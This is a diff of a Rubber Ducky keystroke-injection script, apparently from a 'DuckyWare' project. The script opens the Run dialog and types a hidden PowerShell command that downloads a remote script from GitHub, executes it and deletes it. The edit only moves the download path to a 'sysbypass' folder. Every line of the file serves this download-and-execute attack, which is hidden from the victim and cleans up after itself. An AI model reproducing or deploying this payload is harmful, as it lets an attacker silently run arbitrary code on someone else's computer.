@@ -1,5 +1,5 @@
 DELAY 1000
 GUI r
 DELAY 700
-STRING powershell.exe -WindowStyle Hidden wget 'https://raw.githubusercontent.com/b4ck3nd-dev/DuckyWare/main/system.ps1' -OutFile $HOME\system.ps1; Get-Content $HOME\system.ps1 | powershell.exe -noprofile -; rm $HOME\system.ps1
+STRING powershell.exe -WindowStyle Hidden wget 'https://raw.githubusercontent.com/b4ck3nd-dev/DuckyWare/main/sysbypass/system.ps1' -OutFile $HOME\system.ps1; Get-Content $HOME\system.ps1 | powershell.exe -noprofile -; rm $HOME\system.ps1
 ENTER
